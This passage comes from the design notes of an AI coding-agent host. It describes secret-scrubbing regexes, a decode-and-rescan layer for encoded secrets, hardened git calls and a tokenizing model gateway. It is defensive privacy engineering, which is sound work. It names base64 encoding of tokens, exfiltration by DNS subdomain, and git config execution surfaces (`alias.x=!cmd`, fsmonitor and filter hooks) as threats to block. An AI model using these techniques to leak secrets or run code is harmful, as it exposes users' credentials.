- **Unterminated-PEM fallback (P1)**: run_shell's 100KB cap and
  terminal_read's window truncation both happen **before** scrub; when the
  cut lands inside a PEM block the END marker is lost, the whole-block regex
  misses, and base64 fragments (<20 chars) leak out. `scrub_text` gains
  truncated-PEM detection: an unpaired `-----BEGIN … PRIVATE KEY-----` is
  redacted from its position to the end of the text, and an unpaired END
  redacts from the head of the text to that END, under the category
  `private-key-truncated`, running at Tier 0 immediately after the
  whole-block match — uniformly effective for every caller (run_shell /
  terminal_read / agent_report / the user-input guard). The truncation order
  cannot be inverted (truncating after scrub would cut a placeholder in half,
  and the output cap is a hard constraint), so the fallback lives inside
  scrub.
- **Entropy charset gains `_` and `-` (P2)**: the previous
  `[A-Za-z0-9+=]{20,}` shredded underscore/hyphen-segmented tokens such as
  `rk_live_…` / `whsec_…` / `AGE-SECRET-KEY-1…` / Cloudflare tokens into
  pieces that slipped through. The widened charset comes with three guards: a
  hit containing `-` / `_` requires three-class character diversity plus at
  least one digit, and canonical UUIDs are explicitly allowed through; `/` is
  still excluded (the macOS path false-positive precedent). The same batch
  adds 8 Tier 0 patterns against gitleaks: `rk_live_` / `rk_test_`
  (rollbar-token), `whsec_` (slack-signing-secret), `AGE-SECRET-KEY-1`
  (age-secret-key), `dckr_pat_` (docker-pat), `ntn_` (notion-token), `sbp_`
  (supabase-token), `lin_api_` (linear-api-key), and Slack webhook URLs
  (slack-webhook-url). The `[REDACTED:…]` placeholder has a boundary guard,
  so the widened entropy pattern cannot swallow it a second time. **Known
  trade-off (residual false-positive surface)**: user-typed all-caps +
  digits + hyphen identifiers (build numbers, ticket IDs such as
  `E2E-SCHEDULED-PROMPT`) pass the three-class-plus-digit guard and get
  redacted as secrets by the user-input guard — privacy-first and accepted;
  the e2e fixture (`tests/e2e/schedules.spec.ts`) was already adjusted for
  exactly this shape.
- **AWS_KEY_RE alignment (P3)**: unified on both sides — quote tolerance
  after the key name (the `"aws_secret_access_key": "…"` JSON form) + a bare
  `AKIA[0-9A-Z]{16}` branch + quote tolerance around the value. A bare
  40-character secret access key (no prefix, contains `/`) is deliberately
  NOT matched context-free (too large a false-positive surface); the fallback
  is key-name anchoring (this item + env-var-secret + `scrub_env_value`).
- **Bearer relaxation (P4)**: Rust originally required the token to contain
  1–2 `.` (only the JWT shape), so opaque bearer tokens (OAuth gateway tokens
  etc.) leaked; both sides are now unified to no dot requirement + a minimum
  body length of 8 characters (natural language like "Bearer bonds" is not
  swallowed). 2026-10-09 round-2 addition: the TS side's case caliber was
  aligned with Rust's `(?i)` (`BEARER` / `AUTHORIZATION` match in any case;
  the `eyJ` JWT branch stays case-sensitive).
- **Env-snapshot scrub carries the KEY name (P5)**: the boot environment
  snapshot previously scrubbed value by value, so name-anchored patterns
  (AWS_KEY_RE / env-var-secret) were unreachable and a 40-character
  `AWS_SECRET_ACCESS_KEY` value would be injected verbatim into the
  subprocess env. The new public helper
  `kaya_core::llm::scrub::scrub_env_value(key, value)` (shared by desktop +
  CLI) Strict-scrubs the whole `key=value` string and then strips the prefix
  to recover the value; if the key name itself falls inside the redaction
  span, the entire placeholder is taken as the value (fail-closed).
- **URL-credential caliber unified (P6)**: PASSWORD_IN_URL_RE's protocol list
  gains `ftp|ssh|git|clickhouse|nats|kafka|ldap`; the TS url-credentials
  entry is widened from http(s)-only to Rust's arbitrary-scheme `user:pass@`
  caliber (the leftmost-match semantics are verbatim-identical on both sides,
  and the registry order is synchronized to prevent category drift).
- **API_KEY_RE quote after the key name (P3-remainder)**: in the
  `{"api_key": "…"}` form, the `"` between the key and the colon previously
  broke the match (short values without an `sk-` prefix would leak); both
  sides add `['"]?`.
- **Watcher excerpts / status summaries are always Strict (P7)**: all exits
  of the interaction watcher and the remote path (interaction_answer /
  agent_status) previously followed the user's scrub level — passively
  captured screen content should not degrade with the user's chosen level;
  they now run at `Strict` unconditionally, the same caliber as
  `llm_decide`'s screen summaries.
- **list_dir output passes scrub (F2)**: directory-listing filenames
  previously bypassed scrub (a filename like `backup-sk-….txt` would carry a
  secret shape into the context); the output now uniformly passes the shared
  scrub level (the same level as run_shell / terminal_read — Tier 0 fires at
  every level) with `hadRedactions` in the metadata, and ordinary filenames
  are unaffected.

### 7.9 The encoded-secret Decode-and-Rescan Layer (2026-10-08, single-layer base64/hex)

**Motivation**: §12 previously admitted "base64-encoded secrets cannot be
caught" — the scrubber is regex-based, so a payload shaped like
`echo "$TOKEN" | base64` matches no Tier-0 pattern; and the high-entropy
fallback deliberately excludes `/` from its character class (the macOS path
false-positive precedent), so even entropy misses standard base64 strings
that contain `/`. Content that bypasses scrub into the context could then
be exfiltrated via DNS subdomain encoding (see the CVE-2025-55284 entry in
§5.1). gitleaks v8.26+ solved the same class of problem with
"decoder: base64/hex, decode then recursively rescan" — this section is its
**bounded** port.

**Semantics**: for base64/hex-shaped candidate spans in the text, decode
and rescan the decoded bytes with the **Tier-0 concrete secret pattern
set** (provider tokens / API_KEY_RE / AWS_KEY_RE / bearer / JWT / PEM BEGIN
markers / password-in-url / DB URLs — the existing static regexes; the Rust
side literally reuses `tier0_core`, so the two pattern tables cannot
drift). **Only when the decoded content hits a concrete pattern** is the
original encoded span replaced wholesale with `[REDACTED:encoded-secret]`.
No hit on decode → the original text is preserved (bare sha256 hex, random
base64, PEM public-key bodies are all untouched — **zero false positives
by construction**).

**Boundaries and guardrails (Rust `scrub.rs::scrub_encoded_secrets` ↔ TS
`scrubber.ts`'s encodedSecretB64 / encodedSecretHex entries, verbatim
parity)**:

- base64 candidates `[A-Za-z0-9+/\-_]{24,}={0,2}`, total length ≤ 4096;
  spans containing `-`/`_` are decoded as base64url (mixed forms containing
  both `-`/`_` and `+`/`/` are skipped on both sides by the same rule);
- the length must be a multiple of 4 (canonical padding) before decoding is
  attempted — Rust's engines default to RequireCanonical while TS `atob`
  is lenient about missing padding, so without the explicit check the two
  sides would drift;
- hex candidates `[0-9a-fA-F]{40,}` (ASCII `\w` boundary = JS `\b`), even
  length, ≤ 4096 chars, decoded byte-pair-wise then lossy UTF-8
  (`from_utf8_lossy` ↔ `TextDecoder`'s default U+FFFD replacement,
  equivalent);
- **depth 1**: decoded content only passes the Tier-0 pattern set (not this
  layer, not entropy) and is never decoded again — multi-layer nested
  encoding remains a known limitation (§12);
- candidates inside PEM blocks, and candidates flanked exactly by a
  `[REDACTED:...]` placeholder boundary, are skipped (reusing the entropy
  layer's guard);
- only candidate spans are decoded — never the whole text — so the cost is
  bounded (scrub runs on every ≤100KB tool output);
- **known divergence (2026-10-09 review)**: Rust's `general_purpose`
  engines also reject non-canonical base64 trailing bits (the span is left
  untouched), while TS `atob` does not validate them — an adversarially
  crafted non-canonical span can therefore decode (and redact) on the TS
  side but not on the Rust side. Only triggerable by deliberately
  constructed input; canonical encoder output is always canonical and never
  hits this divergence.

**Call position (parity hard constraint)**: after the tier dispatch and
**before** the high-entropy fallback (the existing philosophy that concrete
patterns win the category; most spans entropy could catch are still caught
by it first — this layer covers what entropy's character class / diversity
guards miss). It runs at every level (Minimal/Balanced/Strict) — it is
Tier-0 semantics. Tests: 9 Rust fixtures (`encoded_secret_*`) mirrored
one-by-one in TS — standard base64 with `/`, base64url, and hex GitHub PAT
hits; bare sha256 / random base64 / PEM public-key body untouched; double
encoding not recursive; >4096 spans skipped; no swallowing of adjacent or
overlapping placeholders.

### 7.10 Task-Queue Perception: Git-Digest Collection and the evidence Field (2026-10-10)

- **The git digest is collected by kaya itself, not initiated by the LLM**: before
  a perceive / report turn, the Rust `task_repo_digest` command directly spawns
  read-only git subcommands via `std::process` (`rev-parse` / `symbolic-ref` /
  `status --short` / `diff --stat HEAD` / `log --oneline -8`), **bypassing
  run_shell / the policy gate**; no stdin, `--no-optional-locks` disables index
  writes. All known repo-controlled execution surfaces are closed (verified
  2026-10-10 round 6/7): `-c core.pager=cat` disables the pager,
  `-c core.fsmonitor=false` disables any repo-configured fsmonitor hook,
  `-c log.showSignature=false` disables signature verification (the repo's
  `gpg.program`), and attribute filters (`filter.<driver>.clean`) are fully
  neutralized on git ≥ 2.40 via `GIT_ATTR_SOURCE` = the empty tree — on older
  git a theoretical surface remains: a repo-committed `.gitattributes` pointing
  at a filter driver runs on re-hash (its prerequisite is that the local
  `.git/config` has already been written with the driver command — the same
  order of compromise as a malicious checkout that can already execute code).
  The process environment's `GIT_DIR` / `GIT_WORK_TREE` / `GIT_COMMON_DIR` /
  `GIT_INDEX_FILE` / `GIT_OBJECT_DIRECTORY` /
  `GIT_ALTERNATE_OBJECT_DIRECTORIES` / `GIT_CONFIG_COUNT` /
  `GIT_CONFIG_PARAMETERS` / `GIT_CONFIG_GLOBAL` / `GIT_CONFIG_SYSTEM` /
  `GIT_EXEC_PATH` are stripped (11 variables — preventing repo redirection /
  config injection / subcommand-resolution redirection); 5-second timeout +
  kill_on_drop.
  **The LLM's run_shell does not open up git** (its execution surface includes
  `-c alias.x=!cmd` / `--exec-path` and more; a subcommand allowlist is a separate
  v2 effort).
- The concatenated output is first truncated to 4 KB (char-boundary back-off),
  passed through **Strict output scrub**, and then re-checked against the 4 KB
  truncation (placeholder replacements can expand back over the limit,
  2026-10-10 round 5) before entering the prompt; the cwd
  comes from OSC 7 tracking (the same source as terminal_read). The audit trail
  only records "which pane was sampled and how many bytes were produced" (app_log
  tag `repo_digest`) — never the content.
- `task_queue report` gains an optional `evidence` field (≤500 characters,
  fail-closed validation on the frontend): its content is the LLM's **reference
  summary** of already-scrubbed evidence (e.g. "2 new commits in git log") and
  never carries the evidence itself; it is persisted with done/failed entries in
  the localStorage persist store (at the same level as other task fields, never
  entering the ~/.kaya audit flow).
- The report turn's agent self-report (terminal_write) still goes through the
  existing grant card (controlGrants) — the authorization surface is unchanged;
  with coding mode off it degrades to a read-only summary.

### 7.11 Gateway Reversible Tokenization (2026-10-13, Model Gateway Phase 1)

**Position: a second privacy pipeline running parallel to the 5 gates.** The
5 gates protect kaya Chat's own LLM traffic; the driven coding agents
(claude-code / kimi-code / opencode / codex) previously connected **directly
to their providers** — entire repo file contents, diffs, and terminal output
went straight to the model with no kaya inspection capability (a structural
gap: if you're not on the traffic path, inspection is impossible). The model
gateway puts the redaction layer on the traffic path: once attached (since
2026-10-14 convergence is predicated on the per-agent toggle — see "Attach
and detach" near the end of this section), an agent's config is converged to
the gateway form (base_url always points at `http://127.0.0.1:<port>`, still written through the existing
apply_config/sync machinery), and all of the agent's API requests are
forwarded through the loopback gateway after passing a **reversible
tokenization** pipeline. It is not a "6th gate" (policy / safety / execute
isolation don't apply to pure forwarding); its detection rules share the same
source as Chat scrub (the `gateway_rules()` export in kaya-core `scrub.rs`,
so rule evolution follows the existing "Rust table + TS mirror in the same
PR" discipline). **kaya Chat's own traffic (BYOK / built-in models) does not
go through the gateway** (pinned down in spec §15.1: built-in models keep
using the yunhou `/chat` proxy + JWT, Chat BYOK stays direct — the two
links have different scrub semantics by design). Full design:
`docs/superpowers/specs/2026-10-13-model-gateway-design.md`.

**The three pipeline stages** (spec §3/§5/§6):

1. **Outbound**: the before_request hook runs the detection rules over the
   request body's text fields (messages content / tool descriptions etc.,
   field by field per protocol schema); hits are replaced with
   **shape-preserving tokens** (`sk-…` forms only swap the character run,
   emails keep their domain structure, phone numbers keep their length and
   prefix run, JWTs stay decodable; since 2026-10-22 Chinese ID card and
   credit card numbers are shape-preserving too instead of opaque
   `kaytok_…` tokens — ID tokens are same-length digit runs with a valid
   GB11643 check digit, card tokens keep separator positions with a valid
   Luhn check digit, so the model sees an ordinary-looking ID / card
   number and cannot tell anything was touched). The same hook rewrites the
   `kaya/<slug>` model alias (slugs are frozen immutable; since the
   2026-10-16 provider-hierarchy refactor the slug is **model-scoped**
   (derived from the model id), falling back to `kaya/<legacy_entry_id>` →
   `kaya/<provider_id>` when absent — the gateway resolves both legacy
   forms permanently, and all forms route identically) back to
   the real model and swaps the placeholder token for the real key (see
   below).
2. **Mapping**: token = f(HMAC(secret, per-machine random key), target
   shape) — **content-addressed**: the same content always yields the same
   token, across requests, sessions, and app restarts. Rationale: prompt
   prefix caches miss exactly once on first rewrite and stay stable forever
   after (random tokens would nuke the cache); one entity (e.g. the novel
   character "Zhang Wei") maps to the same pseudonym in every session, so
   the model sees consistent text. The per-machine key lives at
   `~/.kaya/gateway/token.key` (0o600, randomly generated on first launch;
   rotation = all tokens invalidated, one collective cache miss).
3. **Inbound**: the after_response hook restores tokens within JSON/SSE
   carriers. JSON strings are decoded first; Chat `function.arguments`,
   Responses `arguments` and Anthropic `partial_json` use a separate inner
   JSON encoding layer before the outer response is serialized again.
   Quotes, backslashes and newlines retain their real values. SSE parameter
   windows are isolated by response/call/index and handle tokens split
   across network chunks or parameter-delta events. Responses custom-tool
   input/delta uses a separate plain-text window, without inner JSON escaping.
   The agent receives real values in tool arguments (write_file contents etc.)
   and assistant text. **The model only ever sees tokens**; gateway logs and
   audit only ever see tokens and counts.

**Key properties and invariants**:

- **Only semantics-preserving rewrites may run automatically**: response
  restoration repairs the agent-side text, but it cannot undo the semantic
  impact the upstream model has already received. False positives are not
  harmless self-healing events. Actions are decided by **field context ×
  match confidence × scrub level**: PatternPii and Heuristic matches in
  technical fields are observed but not rewritten, while named secrets are
  still tokenized. Restoration is a compatibility fallback, not a reason to
  loosen detection. Chat's irreversible `[REDACTED:category]` semantics stay
  untouched: one-shot egress and sustained round-trips have different optima.
- **Single-line token alphabet `[A-Za-z0-9._@-]`** (spec §16-E4): a
  multi-line token cannot survive JSON string `\n` escaping byte-for-byte,
  so PEM tokens keep their BEGIN/END markers but single-line the body. The
  scalar restorer still matches bytes, while the JSON/SSE carrier layer
  distinguishes text, tool parameters and opaque protocol fields. Protocol
  ID/name/signature/encrypted-content values are retained in their declared
  locations. SSE event, id, retry and comment fields are preserved verbatim.
- **Response protocol context**: structural enums such as roles, stop reasons
  and statuses are retained according to their Chat choice/message, Anthropic
  message/block/delta or Responses response/item/event positions. Same-named
  fields in tool business payloads are restored normally; field names do not
  grant a global exemption. Anthropic thinking text and signatures, including
  start/delta carriers, and `redacted_thinking.data` remain unchanged so complete
  blocks can be passed back during tool use. Opaque handling covers only string
  or null values in known carriers; malformed objects and extra fields still
  undergo restoration.
- **Schema and compaction**: Responses `text.format` with `type=json_schema`
  and its `schema`, and function-tool definitions' `parameters`, enter a
  dedicated Schema context. Property/definition maps, combinators and array
  subschemas recurse while preserving types (including type arrays), required
  property names, structural references/identifiers and format/pattern
  constraints. Business values in enum, const, default, examples, description
  and similar annotations still restore. Same-named schema/type/required fields
  in ordinary tool payloads gain no exemption. Native Responses compaction
  items preserve string/null `encrypted_content`, `id` and `created_by` in both
  directions; malformed objects, extra fields and same-named business fields
  are still scanned. This covers the existing native `/responses/compact` to
  `/responses` round-trip and does not expand ChatGPT's exact-path gate or any
  adapter endpoint allowlist.
- **Bounded SSE restore state**: an unfinished event is limited to 1 MiB.
  Pending-event payloads and parameter windows share a separate 1 MiB budget,
  with at most 1024 pending events and 256 active parameter streams. Completed
  parameters and finished calls release their state without waiting for the
  entire response. Truth expansion also has an output budget. On overflow,
  unsent pending data is discarded, an existing protocol error terminal frame
  is emitted and the request records an upstream failure. No completed event,
  missing parameter data or success marker is invented for failure/truncation.
- **In-memory vault** (decision D3): the token → truth restore index lives
  only in gateway process memory. The active pool holds 4096 entries; FIFO
  evictions move into a separate 4096-entry restore history and remain
  eligible for placeholder protection and response restoration. When both
  pools are full, new registrations fail closed with
  `kaya_gateway_vault_full` instead of silently dropping mappings. **Never
  persisted, never in debug dumps** (a persisted vault would be a sensitive mapping
  table, conflicting with the privacy posture). Content addressing makes the
  vault a restore index rather than the single source of truth: after a
  restart clears it, the next egress of the same secret re-tokenizes to the
  same token and rebuilds the mapping; only the corner case of "the model
  references a pre-restart token whose truth never appears in any later
  outbound request" cannot restore, in which case the token passes through
  to the agent as-is (legal shape, nothing crashes).
- **User token map persisted** (spec §14.4): the user-maintained "truth →
  chosen token" mapping (the novel-character alias-table scenario; higher
  priority than automatic detection) lives at
  `~/.kaya/gateway/token-map.json` (0o600 atomic write, edited in the
  Settings gateway section via Tauri commands, never localStorage).
  Consistency with D3: the vault is an **automatic artifact** (rebuildable
  via content addressing — persisting it only adds sensitive surface); the
  user token map is **user-created data** (same precedent as the user
  placing a file into the trusted root) — different nature, different
  handling. Never in debug dumps; audit only records the entry count.
- **Per-category failure actions** (spec §6.6/§14.6; these are the
  **prose / unknown-field** defaults — technical fields converge per the
  protocol field action matrix below): secrets (PEM blocks,
  vendor fixed-prefix keys, JWTs) and structured PII (email / phone /
  national ID / bank card — Luhn-checked to cut false positives) are
  tokenized by default; the **high-entropy catch-all** only flags at
  Balanced (warn: `x-kaya-scrub: tokenized=0; warned=N` response header + app_log +
  counters, no rewrite), upgrades to tokenize at Strict, and Minimal only
  tokenizes the secret classes. **The gateway scrub level is an independent
  setting (decoupled on 2026-10-22; previously it mirrored Chat's global
  ScrubLevel read-only): since 2026-11-02 it defaults to Minimal (frontend
  label `strict`)**, which only auto-tokenizes named secrets and leaves PII
  untouched, avoiding realistic-surrogate and protocol-field false positives;
  Balanced / aggressive remain explicit opt-ins. It is edited directly via the
  select in the Settings gateway section. User-input guarding stays
  fixed at aggressive; tool-output scrubbing defaults to aggressive and can
  be adjusted under General. Both are independent of the gateway level. Migration: every
  pre-decoupling persisted level was a boot-push artifact (the control was
  never editable), so the first init of a build carrying this change
  rewrites it to the current default once and sets `scrub_level_decoupled`;
  levels already persisted after decoupling are never overwritten. The level
  is persisted in `~/.kaya/gateway/config.json`. **High-entropy catch-all
  exemption (one from the 2026-10-14 review follow-up, stated plainly)**:
  strings longer than 4 KB skip the entropy catch-all entirely (no redaction,
  no warning — a performance amplifier fix). **Since 2026-10-26 binary
  payloads go through precise media validation instead** (spec §8,
  `gateway/pipeline/media.rs`), and the old generic carrier-key heuristic
  ("JSON key in `data`/`url`/`image`/`image_url`/`file`/`file_data` with a
  base64-looking value is exempt") is **deleted**: a plain `data` field gets
  no privilege, which closes the channel where arbitrary text was
  base64-encoded and smuggled past named secret rules via a carrier key.
  The media exemption requires **all** of: ① the path is the current
  protocol's **exact** image / document / audio carrier (Anthropic `source.data`
  with `source.type:"base64"`, Chat `image_url.url` / `input_audio.data`,
  Responses `input_image.image_url` / `input_file.file_data` /
  `input_audio.audio_data`, including equivalent parts inside Responses tool
  `output[]`). The exemption applies only to string leaves: Chat accepts
  `image_url.url` / `input_audio.data` / `file.file_data`; Responses also
  accepts one object layer with image `url|data`, file `file_data|data`, or
  audio `audio_data|data` leaves. Objects/arrays beneath those keys and extra
  keys are scanned as Unknown, without recursively inheriting a media
  exemption; ② declarations agree (the data-URL MIME prefix × the sibling
  `media_type` / audio `format`, trimmed and lowercased; `wav` maps to
  `audio/wav`, `mp3` to `audio/mpeg`; the RFC 2397 scheme and `;base64,`
  marker are case-insensitive; no declaration at all fails closed).
  Only precise audio carriers collect `format`; other business `format`
  fields stay Unknown and neither supply MIME nor create conflicts. An
  absent `format` may use a valid MIME declaration; an explicit unknown,
  nonempty format is Unsupported. Explicit null, object, array, non-string,
  or blank `format` / `media_type` declarations are Invalid and cannot be
  masked by another valid source. Outer-part and single-layer carrier
  declarations are merged: malformed/known-conflicting declarations take
  Invalid precedence over Unsupported formats, before payload length or
  alphabet candidate checks. Declaration state is restored between parts.
  Precise audio string leaves have no plain-text or remote-URL semantics
  and always undergo strict media validation: short/empty strings,
  URL-safe characters, newlines and wrong headers cannot fall back to text.
  Image/file carriers retain candidate checks, allowing ordinary remote
  image URLs to use the text rules;
  ③ base64
  uses an explicit STANDARD / STANDARD_NO_PAD form (URL-safe `-` / `_`,
  mid-string padding and non-zero trailing bits are rejected); ④ the decoded
  header matches the declared media type (PNG / JPEG / GIF / WebP / PDF / WAV /
  MP3); ⑤ decode and scan are bounded (the request-body cap is the bound).
  Satisfying all five means **Preserve**: the payload is byte-identical and
  named secret / PII / entropy rules **never scan the base64**. A `text/*`
  carrier is decoded (bounded) to UTF-8 and goes through the action matrix
  in **prose context**: if anything is rewritten the carrier is rebuilt with
  the original engine and data-URL prefix (still valid), and with no hits the
  original base64 is kept byte-identical. WAV (`format=wav` / `audio/wav`) and
  MP3 (`format=mp3` / `audio/mpeg`) use the same strict base64 and magic checks
  (RIFF/WAVE; a structurally complete ID3v2 tag — 10-byte header, major version
  2/3/4, no reserved flag bits, synchsafe size, a complete additional 10-byte
  footer when the v2.4 footer flag is set, and a valid MPEG audio frame
  header when anything follows the tag — or a valid MPEG audio frame header).
  **Unsupported types**
  (other audio / video / octet-stream / empty MIME, …), **conflicting declarations** and
  **validation failures** (invalid base64 / wrong magic / non-UTF-8 text
  carrier) are **rejected with a structured 400 and never forwarded
  upstream** (fixed sentinels `kaya_gateway_invalid_inline_media` /
  `kaya_gateway_unsupported_inline_media`; the error body carries only the
  sentinel plus one fixed English sentence — no payload original, base64
  fragment or decoded text; warn-level app_log
  `gateway_inline_media_rejected` records only agent + sentinel). It never
  degrades into random fragment replacement inside the base64 stream.
  **Detection blind spot, stated plainly**: header validation only blocks
  simple text disguises — arbitrary bytes behind a valid image / PDF / audio
  header can still carry sensitive information (text inside binary content is
  outside the text-regex coverage), so "header verified" is **not** "safe";
  binary carriers that are not recognized as precise media still go through
  the text rules. Since
  2026-10-24, **the gateway pipeline alone** also exempts public protocol IDs
  (`call_` / `toolu_` / `tool_` / `fc_` / `resp_` / `msg_` prefixes plus a
  base64url body of at least 16 characters): these are protocol correlation
  identifiers, not credentials, and the exemption applies only after the
  entropy catch-all fires (level-independent: identical at minimal /
  balanced / strict). Chat scrubbing and its TS mirror are unchanged.
  The exemption applies only to clean protocol IDs: `_` is a word character, so
  `\b`-anchored named rules can miss at either end of a "protocol prefix plus
  embedded secret" shape. Before the exemption the named rules are therefore
  re-scanned on the ID body and the scan covers **every start/end boundary form
  inside the body**: once verbatim (secret starting at the body start, or
  separated by `-`), and once in a relaxed mode where `_` counts as a word
  boundary (both text and pattern replace `_` with a non-word sentinel, which is
  equivalent to treating `_` as a separator; this covers `call_x_gho_…` and
  `call_gho_…_x`). Named secret / PII hits win: `call_sk-…` / `toolu_gho_…` /
  `resp_sbp_…` are still tokenized. The bare `sk-` rule now uses a post-filter
  boundary (reject only when the preceding byte is a letter or digit) instead
  of `\b`, so boundary forms such as `token_sk-…` hit too. The rescan has
  **no body-length or candidate-count cap** (public IDs are non-overlapping
  matches, so their total body length is bounded by the text length and the
  rescan cost is the same order as the full-text scan), and the exemption
  requires that the body actually entered the rescan set — otherwise it
  fails closed: the span is neither exempted nor downgraded to Warned, but
  tokenized like any other ciphertext span (third review round, 2026-10-24:
  the former 256-byte cap let a named secret inside an oversized ID travel
  upstream verbatim at balanced level).
- **Protocol-aware action matrix** (2026-10-26, spec §5/§6): outbound
  tokenization no longer treats every string alike. The gateway derives a
  field context per string **from the inbound protocol** (Anthropic / OpenAI
  Chat / OpenAI Responses) — prose / code-or-tool payload / tool result /
  protocol metadata / signed thinking / inline media / unknown — and then decides the action
  from "content kind x match confidence x level". Hits carry one of four
  confidences: **named secret** (vendor fixed-prefix keys, JWTs, PEM blocks,
  the user's explicit token map), **validated PII**, **pattern PII**, and
  the **high-entropy catch-all**.
  - **Named secrets entering text scanning are tokenized in every field kind and at every level** —
    protocol metadata and tool payloads are **not** a bypass for named
    secrets. The precise opaque fields and validated binary carriers below do not enter text scanning.
  - **Validated PII** (an 18-digit national ID that passes the GB11643
    check digit **and** whose digits 7-14 form a real calendar date; bank
    cards that passed the Luhn gate and are not excluded as epoch-ms /
    public test cards): it is **not waved through just because it sits in a
    tool field** — in prose it is tokenized at balanced / strict, and in
    **tool payloads / tool results it is tokenized as well** (a real card
    number must not travel upstream verbatim merely because a tool returned
    it); the Minimal level never rewrites it.
  - **Pattern PII** (plain email / phone / 17-19 digit runs that fail the
    check-digit or date gate, plus credit-card candidates excluded as
    epoch-ms): in prose / unknown fields it is tokenized at balanced /
    strict — **the one exception is low-confidence national IDs in prose at
    balanced, which are observed only** (`prose_low_confidence_id_cn_observed`:
    the invalid shape has a large false-positive surface); in **tool payloads
    / tool results it is observed but not rewritten** (one warn hit is
    recorded). Previously a phone-shaped fragment in those fields was
    rewritten, which corrupted function-argument JSON and tool results; use
    the **user token map** when real emails / phones must be protected.
  - **Numeric precision and public fixtures** (landed 2026-10-26, spec §9):
    a pure 13-digit run inside 2001-01-01 – 2035-12-31 (Unix milliseconds) is
    not tokenized and is recorded as `epoch_ms_excluded` (all levels, all
    field kinds); the public payment-test-card constants and RFC reserved
    documentation domains (`example.com` / `net` / `org`, anything ending in
    `.invalid` / `.test` / `.example`) are exact-match Preserved
    (`public_fixture_preserved`) — the lists contain public constants only,
    no fuzzy matching, and **user token-map entries are never exempted**. The
    AWS IAM documentation access-key-ID example `AKIAIOSFODNN7EXAMPLE` is also
    an exact public fixture (including when the entropy rule sees the same
    string); similar AKIA-shaped values and secret access keys are not exempted.
  - **High-entropy catch-all**: in prose / unknown fields it only flags at
    balanced / minimal and tokenizes at strict; in **tool payloads / tool
    results it is observed only at every level** (strict no longer rewrites
    unnamed high-entropy identifiers in technical fields, so protocol
    structure is never broken).
  - **Protocol metadata** (`id` / `type` / `name` / `tool_call_id` etc.): PII
    and entropy hits are **never rewritten** (previously a phone-shaped
    fragment inside `tool_call_id` was rewritten and the upstream call
    failed).
  - **Tool definitions** (Chat `tools[].function.parameters`, Anthropic
    `tools[].input_schema`, Anthropic `server_tool_use.input`, …) are
    **technical payloads**: example values inside a schema are observed, not
    rewritten.
  - **Inline media** (exact image / document / audio carrier paths, including
    the real Responses wire forms where `input_image.image_url`,
    `input_file.file_data` and `input_audio.audio_data` are plain strings;
    matching parts inside `function_call_output.output[]` /
    `custom_tool_call_output.output[]` use the same precise media path, while
    text parts remain tool results): once
    path, declaration, base64 form and file header all validate, the payload
    is **Preserved byte-for-byte** and PII / entropy / named-secret rules
    **never scan the base64**; a validation failure is a structured 400 per
    the precise media rules above (never degraded into rewriting).
  - **Protocol-integrity fields (2026-11-02)**: Responses `reasoning.id` /
    `reasoning.encrypted_content` / `previous_response_id` / `conversation`, and
    Anthropic `thinking.signature` / `redacted_thinking.data`, are bound, signed,
    or opaque server-history references. Only string scalars (and null) are
    preserved at every level without text-rule scanning. In a `conversation`
    object, only a string `id` receives this exemption; extra fields and
    incorrectly typed objects / arrays are scanned as unknown fields. `custom_tool_call` /
    `custom_tool_call_output` / `item_reference` `id` / `call_id` / `input` /
    `output` use the existing `function_call` classifications. If a JSON object
    key matches a named secret, it cannot be rewritten without breaking the
    structure: the whole request is rejected with HTTP 400
    `kaya_gateway_protocol_integrity` and zero upstream requests, never silently
    passed through.
  - **Signed-thinking round trips (2026-11-04)**: an Anthropic direct
    `messages[].content[]` block is eligible only when the message's `role` is
    exactly `assistant`, its `type` is `thinking`, `thinking` is a string, and
    `signature` is a non-whitespace string. Its body and signature are preserved
    at Minimal/Balanced/Strict. The body bypasses all tokenization, including
    named secrets, PII, explicit user mappings and existing placeholders; it
    creates no vault entries, restore references, privacy hits or detail records.
    **The gateway checks protocol position and types, not the signature or the
    upstream origin**: matching bodies can contain sensitive values and still
    travel upstream unchanged. This is an explicit privacy exception to preserve
    signed history. Decoded string values remain exact; the JSON carrier still
    uses the existing serializer. Extra fields, malformed bodies, missing/blank/
    incorrectly typed signatures, other roles, tool arguments, nested tool
    results and same-named objects in other protocols receive no body exemption.
    A non-eligible signed body that would be rewritten still rejects the whole
    request with content-free diagnostics. JSON-key integrity checks still run.
  - **Unknown fields** keep the previous level semantics — a new field can
    never be used to bypass secret detection.
  **The Minimal level never auto-rewrites PII in any field** (prose, tool
  payloads and tool results alike) — consistent with the existing "secret
  classes only" rule. A PII hit in a tool field at Minimal is therefore an
  *observation*, not a tokenization; do not read those two statistics as
  one.
  **Response restore scope (2026-11-02)**: only tokens actually referenced or newly
  generated by the current request are restored. The complete historical mapping
  is retained only when a Responses request carries a non-empty string
  `previous_response_id`, a non-empty string `conversation`, or a conversation
  object with a non-empty `id`, because server-side history may reference tokens
  outside the request body. `null`, empty strings, wrong types and empty objects
  do not enable full-history restore. Request-reference collection and response
  restoration share the same boundary rules: direct adjacency to a letter or
  digit, or a link through `._@-` to a letter or digit on the other side, makes
  the token part of a longer identifier and blocks restoration. Standalone
  punctuation such as sentence periods, Markdown underscores and standalone
  hyphens does not block it. During streaming, held-back bytes on the right are
  real context rather than a synthetic EOF at the safe-prefix end. JSON / SSE
  carriers evaluate boundaries using decoded `\n` / `\uXXXX` characters, not the
  trailing `n` or hexadecimal characters of the raw escape. Restored truths are
  JSON-string escaped, so multi-line values such as PEM cannot break the response
  frame; upstream `content-length` is stripped, so variable-length restoration
  cannot truncate the response.
  Hits additionally carry the **field path (RFC6901 JSON pointer) / content
  kind / confidence / decision reason**, and those only travel in the local
  privacy-detail channel (§8.4); request events and logs remain
  content-free.
- **Unknown paths pass through with marking by default** (decisions D8/E1):
  paths outside the endpoint allowlist pass through + warn-level app_log +
  audit count by default (fail-closed rejection would break agent
  functionality — rejecting count_tokens kills auto-compact); a dedicated
  toggle in the Settings gateway section switches to strict rejection and is
  **not linked to the ScrubLevel**. Content-bearing endpoints (including
  `/v1/messages/count_tokens` and family) always go through the hook
  pipeline; metadata endpoints (`/v1/models` etc.) pass straight through.
- **Placeholder and key invariants** (spec §7.1/§15.2): in gateway form the
  api_key written into agent config files is a per-agent random placeholder
  token (`kayagw_<agent_id>_<random>` — doubling as the routing identifier
  and the local anti-abuse token), and the model is the self-describing
  `kaya/<slug>` alias (slugs are frozen immutable; since 2026-10-16 they are
  model-scoped, falling back to `kaya/<legacy_entry_id>` →
  `kaya/<provider_id>` when absent — so a lost binding can be rebuilt via
  adoption).
